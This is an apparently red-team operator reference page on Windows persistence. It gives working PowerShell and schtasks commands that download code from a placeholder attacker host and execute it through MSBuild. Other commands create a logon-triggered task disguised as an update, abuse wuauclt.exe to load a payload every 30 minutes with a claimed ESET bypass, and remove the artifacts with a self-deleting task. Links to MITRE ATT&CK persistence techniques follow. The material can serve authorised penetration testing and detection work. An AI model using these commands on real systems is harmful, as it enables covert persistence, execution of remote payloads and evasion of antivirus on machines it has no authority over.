<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# Windows Persistence
### References

### Example Attacks
* <details><summary>Scheduled Task (Click to expand) ([`Scheduled Task-Job - Scheduled Task` TTP](TTP/T1053_Scheduled_Task-Job/005_Scheduled_Task/T1053.005.md))</summary><p>
	* Creation Process
		1. Create batch script with desired actions (e.g. MSBUILD) `C:\Users\Public\batfile.bat`

				powershell.exe Invoke-Command -ScriptBlock {$var = New-Object net.webclient; $a = $var.downloadstring('<INFRASTRUCTURE>'); Set-Content -Path C:\Users\Public\downloads\jnk_1.txt -value $a;}
				C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe c:\users\public\downloads\jnk_1.txt
		1. Execute the following command to create a scheduled task

				schtasks.exe /create /sc onlogon /tn "blsUpdate" /tr "\"cmd.exe\" \"/c start /min c:\users\public\batfile.bat\""
		1. Another example which bypasses ESET and spawns a process every 30 minutes:

				Invoke-Command -ScriptBlock {$action = New-ScheduledTaskAction -Execute wuauclt.exe -Argument "/UpdateDeploymentProvider C:\users\public\downloads\installer.txt /RunHandlerComServer"; $trigger = New-ScheduledTaskTrigger -Daily -At 12am; $task = Register-ScheduledTask -TaskName winUpdate -Trigger $trigger -Action $action; $task.Triggers.Repetition.Duration="P1D"; $task.Triggers.Repetition.Interval="PT30M"; Set-ScheduledTask -InputObject $task}
		1. To delete this task and remove any artifacts, the following command can be used:

				schtasks.exe /delete /f /tn "winUpdate"

				$A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument '/c del C:\Users\Public\Downloads\installer.txt'
				$T = New-ScheduledTaskTrigger -Once -At (get-date).AddSeconds(10); $t.EndBoundary = (get-date).AddSeconds(60).ToString('s')
				$S = New-ScheduledTaskSettingsSet -StartWhenAvailable -DeleteExpiredTaskAfter 00:00:30
				Register-ScheduledTask -TaskName "Cleanup" -Action $A -Trigger $T -Settings $S

				taskkill /IM "wuauclt.exe" /F

			* It is necessary to create a self-destructing task to do this due to the shell that is spawned through the scheduled task being unable to delete its own payload. 
	* Identify actions run by a scheduled task
		* Option 1

				schtasks /query /tn "winUpdate" /v
		* Option 2

				$task = Get-ScheduledTask | where TaskName -EQ 'winUpdate'
				$task.Actions
		* Option 3

			```
			$taskPath = "Adobe Acrobat Update Task"
			Get-ScheduledTask -TaskName $taskPath |
				ForEach-Object { [pscustomobject]@{
				 Name = $_.TaskName
				 Path = $_.TaskPath
				 LastResult = $(($_ | Get-ScheduledTaskInfo).LastTaskResult)
				 NextRun = $(($_ | Get-ScheduledTaskInfo).NextRunTime)
				 Status = $_.State
				 Command = $_.Actions.execute
				 Arguments = $_.Actions.Arguments }} |
					echo
			```

* Scheduled Task TTPs
	* ([`Scheduled Task-Job - At Windows` TTP](TTP/T1053_Scheduled_Task-Job/002_At_Windows/T1053.002.md))
	* ([`Scheduled Task-Job - Cron` TTP](TTP/T1053_Scheduled_Task-Job/003_Cron/T1053.003.md))
	* ([`Scheduled Task-Job - Launchd` TTP](TTP/T1053_Scheduled_Task-Job/004_Launchd/T1053.004.md))
	* ([`Scheduled Task-Job - Systemd Timers` TTP](TTP/T1053_Scheduled_Task-Job/006_Systemd_Timers/T1053.006.md))
	* ([`Scheduled Task-Job` TTP](TTP/T1053_Scheduled_Task-Job/T1053.md))
* Boot/Logon Autostart Execution ([`Boot or Logon Autostart Execution` TTP](TTP/T1547_Boot_or_Logon_Autostart_Execution/T1547.md))
	* Authentication Package ([`Boot or Logon Autostart Execution - Authentication Package` TTP](TTP/T1547_Boot_or_Logon_Autostart_Execution/002_Authentication_Package/T1547.002.md))
	* Kernel Modules ([`Boot or Logon Autostart Execution - Kernel Modules and Extensions` TTP](TTP/T1547_Boot_or_Logon_Autostart_Execution/006_Kernel_Modules_and_Extensions/T1547.006.md))
	* LSASS Driver ([`Boot or Logon Autostart Execution - LSASS Driver` TTP](TTP/T1547_Boot_or_Logon_Autostart_Execution/008_LSASS_Driver/T1547.008.md))
	* Plist Modification ([`Boot or Logon Autostart Execution - Plist Modification` TTP](TTP/T1547_Boot_or_Logon_Autostart_Execution/011_Plist_Modification/T1547.011.md))
	* Port Monitors ([`Boot or Logon Autostart Execution - Port Monitors` TTP](TTP/T1547_Boot_or_Logon_Autostart_Execution/010_Port_Monitors/T1547.010.md))
	* Print Processors ([`Boot or Logon Autostart Execution - Print Processors` TTP](TTP/T1547_Boot_or_Logon_Autostart_Execution/012_Print_Processors/T1547.012.md))
	* Registry Run ([`Boot or Logon Autostart Execution - Registry Run Keys - Startup Folder` TTP](TTP/T1547_Boot_or_Logon_Autostart_Execution/001_Registry_Run_Keys_-_Startup_Folder/T1547.001.md))
	* Time Providers ([`Boot or Logon Autostart Execution - Time Providers` TTP](TTP/T1547_Boot_or_Logon_Autostart_Execution/003_Time_Providers/T1547.003.md))
	* Winlogon Helper ([`Boot or Logon Autostart Execution - Winlogon Helper DLL` TTP](TTP/T1547_Boot_or_Logon_Autostart_Execution/004_Winlogon_Helper_DLL/T1547.004.md))
	* Security Support ([`Boot or Logon Autostart Execution - Security Support Provider` TTP](TTP/T1547_Boot_or_Logon_Autostart_Execution/005_Security_Support_Provider/T1547.005.md))
	* Re-opened ([`Boot or Logon Autostart Execution - Re-opened Applications` TTP](TTP/T1547_Boot_or_Logon_Autostart_Execution/007_Re-opened_Applications/T1547.007.md))
	* Shortcut Modification ([`Boot or Logon Autostart Execution - Shortcut Modification` TTP](TTP/T1547_Boot_or_Logon_Autostart_Execution/009_Shortcut_Modification/T1547.009.md))


([`Boot or Logon Initialization Scripts - Logon Script Windows` TTP](TTP/T1037_Boot_or_Logon_Initialization_Scripts/001_Logon_Script_Windows/T1037.001.md))
([`Boot or Logon Initialization Scripts - Startup Items` TTP](TTP/T1037_Boot_or_Logon_Initialization_Scripts/005_Startup_Items/T1037.005.md))
([`Boot or Logon Initialization Scripts` TTP](TTP/T1037_Boot_or_Logon_Initialization_Scripts/T1037.md))
